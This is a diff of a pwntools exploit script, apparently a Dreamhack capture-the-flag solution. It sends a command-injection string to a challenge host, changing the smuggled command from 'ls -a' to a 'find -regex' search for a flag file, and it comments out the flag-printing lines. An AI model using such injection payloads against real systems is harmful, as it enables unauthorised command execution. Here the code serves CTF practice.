@@ -12,14 +12,15 @@ else:
 	HOST = int(input("Host: "))
 	p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
 
-key = "'Hi' && ls -a || cd"
+key = "'Hi' && find -regex 'fla[a-z]' || cd"
 
 p.recvuntil("-")
 p.sendline(key)
 p.recvuntil("Hi")
-flag = p.recvline()
-log.info(f"Flag is {flag}")
 p.recvuntil("-")
-p.sendline("A")
+#flag = p.recvline()
+#log.info(f"Flag is {flag}")
+#p.recvuntil("-")
+#p.sendline("A")
 
-p.interactive()
+#p.interactive()
